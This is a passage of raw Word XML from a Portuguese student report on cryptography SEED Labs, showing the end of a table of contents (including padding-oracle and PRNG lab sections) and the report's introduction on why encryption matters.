            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="032FD1D9" w14:textId="5AF69BB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89" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Padrão Identificado no PKCS#5</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881989 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>75</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5C922BFA" w14:textId="3C8B0B89"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0" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>O Papel do Vetor de Inicialização (IV)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881990 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>75</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6EADEDDC" w14:textId="4ED87F25"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1" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Exercício 2: Exploração do Oracle Padding</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881991 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>75</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="218B122D" w14:textId="2E17FA93"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2" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Contextualização do Ataque</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881992 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>75</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6F45088F" w14:textId="0CF215B1"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3" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Fundamentos Teóricos da Exploração</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881993 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>75</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="46664957" w14:textId="5B765ED0"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4" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Estratégia de Ataque</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881994 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>75</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5D185DF4" w14:textId="5C8C0DC8"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5" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Execução Manual (Primeiros 6 Bytes)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881995 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>76</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0AD94132" w14:textId="18916B7E"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6" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Automatização com Python</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881996 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>77</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4BA6CFB0" w14:textId="206971F8"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7" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Resultado Final</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881997 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>79</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="597A7970" w14:textId="7E4A48F0" w:rsidR="00842992" w:rsidRDefault="00842992">
          <w:pPr>
            <w:pStyle w:val="ndice2"/>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8" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Exercício 3: Ataque Completo Automatizado</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881998 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>79</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4A91AA1C" w14:textId="794362E6"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1999" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Nova Configuração</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881999 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>79</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5137C7A4" w14:textId="1BEF35BC"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2000" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Estratégia Modificada</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213882000 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>80</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="63F2C5C1" w14:textId="215957B6"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2001" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Implementação Completa</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213882001 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>80</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="73995B85" w14:textId="77F35AE0" w:rsidR="00842992" w:rsidRDefault="00842992">
          <w:pPr>
            <w:pStyle w:val="ndice3"/>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2002" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Resultado da Execução</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213882002 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>82</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5D58F86C" w14:textId="609627D7"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2003" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Apêndice G – Relatório SEED Labs — PRNG</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213882003 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>84</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="393F31DC" w14:textId="78049C35" w:rsidR="00842992" w:rsidRDefault="00842992">
          <w:pPr>
            <w:pStyle w:val="ndice1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8494"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="pt-PT"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc213882004" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Conclusão</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213882004 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>90</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5D896D26" w14:textId="48688A9B" w:rsidR="00363733" w:rsidRDefault="00363733">
          <w:r>
            <w:rPr>
              <w:b/>
              <w:bCs/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="52CF0D4F" w14:textId="4DDB948F" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="6C3E7DFE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34746180" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC" w:rsidP="00363733">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FCD3873" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc213874692"/>
      <w:bookmarkStart w:id="1" w:name="_Toc213881889"/>
      <w:r>
        <w:t>Introdução</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w14:paraId="2EFB8286" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="01CB1424" w14:textId="59381ABB" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">No mundo contemporâneo, a sociedade está constantemente em comunicação, </w:t>
      </w:r>
      <w:r w:rsidRPr="00224B0C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>e-mails</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00224B0C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>chamadas telefónicas</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00224B0C" w:rsidRPr="00224B0C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>SMS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> e troca de mensagens ocorrem centenas de milhões de vezes todos os dias, conectando pessoas do mundo inteiro. Toda essa comunicação está suscetível a </w:t>
      </w:r>
      <w:r w:rsidRPr="00224B0C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>intercetação</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00224B0C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>adulteração</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:r w:rsidRPr="00224B0C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>desvio</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, pois o seu tráfego </w:t>
      </w:r>
      <w:r w:rsidRPr="00224B0C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>pode ser capturado facilmente</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> enquanto circula na internet. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66D06B2A" w14:textId="19BA31E2" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Para garantir a </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>integridade e disponibilidade</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> desta troca de informação, foram desenvolvidas tecnologias capazes de </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>cifrar essas mensagens antes de serem enviadas</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> e então </w:t>
      </w:r>
      <w:r w:rsidR="00363733" w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>decifrá-las</w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> apenas quando chegarem ao seu destino</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, protegendo o seu conteúdo enquanto circulam pelo mundo. Estas tecnologias são conhecidas como </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>algoritmos de criptografia</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64AC0C0A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Neste relatório, iremos abordar os algoritmos mais utilizados nos protocolos de criptografia de hoje em dia, elucidando seu funcionamento e quando são utilizados. O seu estudo deu-se através da resolução de </w:t>
      </w:r>
      <w:hyperlink r:id="rId8" w:history="1">
        <w:r w:rsidR="004253CC">
          <w:rPr>
            <w:rStyle w:val="Hiperligao"/>
          </w:rPr>
          <w:t>SEED labs</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> voltados para criptografia e aulas teóricas realizadas em sala de aula.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3756CE0D" w14:textId="0BCDAF31" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Antes de abordarmos os exercícios práticos, focaremos em uma </w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>pequena introdução</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> sobre o que é criptografia e o </w:t>
      </w:r>
      <w:r w:rsidR="00392CCA" w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>porquê</w:t>
      </w:r>
      <w:r w:rsidRPr="00392CCA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> de sua importância</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="182B8A36" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="59620A04" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21271179" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc213874693"/>
      <w:bookmarkStart w:id="3" w:name="_Toc213881890"/>
      <w:r>
        <w:t>Criptografia</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w14:paraId="72D61683" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
